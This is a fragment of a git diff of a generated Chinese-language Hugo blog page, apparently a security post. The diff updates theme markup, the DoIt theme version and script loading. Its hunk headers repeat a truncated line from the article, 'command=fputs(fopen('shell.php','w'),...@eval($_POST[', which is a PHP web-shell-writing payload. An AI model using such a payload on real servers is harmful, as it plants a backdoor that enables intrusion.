+            srcset="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129225225.png, https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129225225.png 1.5x, https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129225225.png 2x"
+            sizes="auto"
             alt="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129225225.png">
-    </a></p>
+    </a></figure></p>
 </div>
 
         <div class="post-footer" id="post-footer">
@@ -991,7 +1003,7 @@ command=fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[
             </noscript></div></article></div>
         </main><footer class="footer">
         <div class="footer-container"><div class="footer-line">
-                    由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreferrer" title="Hugo 0.92.0">Hugo</a> 强力驱动&nbsp;|&nbsp;主题 - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreferrer" title="DoIt 0.2.13"><i class="far fa-edit fa-fw"></i> DoIt</a>
+                    由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreferrer" title="Hugo 0.92.0">Hugo</a> 强力驱动&nbsp;|&nbsp;主题 - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreferrer" title="DoIt 0.3.0"><i class="far fa-edit fa-fw"></i> DoIt</a>
                 </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank" rel="noopener noreferrer">Braindance</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
             <div class="footer-line"></div>
             <div class="footer-line">
@@ -1003,7 +1015,7 @@ command=fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[
         </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
             <i class="fas fa-comment fa-fw"></i>
         </a>
-    </div><div class="assets"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/fuse/fuse.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/topbar/topbar.min.js"></script><script type="text/javascript" src="/lib/pjax/pjax.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script><script type="text/javascript">
+    </div><div class="assets"><link rel="stylesheet" href="/lib/lightgallery/lightgallery.min.css"><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{"twikoo":{"commentCount":true,"el":"#twikoo","envId":"https://twikoo.penginman.com/","lang":"zh-cn"}},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"search":{"distance":100,"findAllMatches":false,"fuseIndexURL":"/index.json","highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":false,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"没有找到结果","snippetLength":50,"threshold":0.3,"type":"fuse","useExtendedSearch":false},"twemoji":true};</script><script type="text/javascript" src="/lib/twikoo/twikoo.all.min.js" defer></script><script type="text/javascript" src="/js/twikoo.min.js" defer></script><script type="text/javascript" src="/lib/twemoji/twemoji.min.js" defer></script><script type="text/javascript" src="/js/twemoji.min.js" defer></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script><script type="text/javascript">
             window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
             gtag('config', 'UA-176925141-1', { 'anonymize_ip': true });
         </script><script type="text/javascript" src="https://www.googletagmanager.com/gtag/js?id=UA-176925141-1" async></script><script>
@@ -1015,8 +1027,6 @@ command=fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[
 			  s.parentNode.insertBefore(hm, s);
 			})();
 		</script></div>
-
-<div class="pjax-assets"><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{"twikoo":{"commentCount":true,"el":"#twikoo","envId":"https://twikoo.penginman.com/","lang":"zh-cn"}},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"search":{"distance":100,"findAllMatches":false,"fuseIndexURL":"/index.json","highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":false,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"没有找到结果","snippetLength":50,"threshold":0.3,"type":"fuse","useExtendedSearch":false},"twemoji":true};</script><script type="text/javascript" src="/lib/twikoo/twikoo.all.min.js" defer></script><script type="text/javascript" src="/js/twikoo.min.js" defer></script><script type="text/javascript" src="/lib/twemoji/twemoji.min.js" defer></script><script type="text/javascript" src="/js/twemoji.min.js" defer></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><link rel="stylesheet" href="/lib/lightgallery/lightgallery.min.css"></div>
 </body>
 
 </html>
